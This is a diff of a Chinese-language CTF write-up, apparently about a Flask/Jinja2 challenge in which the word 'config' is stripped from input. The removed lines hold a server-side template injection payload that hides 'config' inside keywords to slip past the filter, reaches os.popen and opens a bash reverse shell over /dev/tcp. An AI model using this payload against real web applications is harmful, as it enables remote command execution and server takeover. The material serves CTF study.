@@ -6,11 +6,8 @@
 
 发现config被置空了
 
-那么可以利用config来bypass
+那么可以利用config来bypass if等东西
 
-```
-{% iconfigf ''.__claconfigss__.__mconfigro__[2].__subclasconfigses__()[59].__init__.func_glconfigobals.linecconfigache.oconfigs.popconfigen('bash -i >& /dev/tcp/127.0.0.1/233 0>&1') %}1{% endiconfigf %}
-```
 
 ## mypassword
 
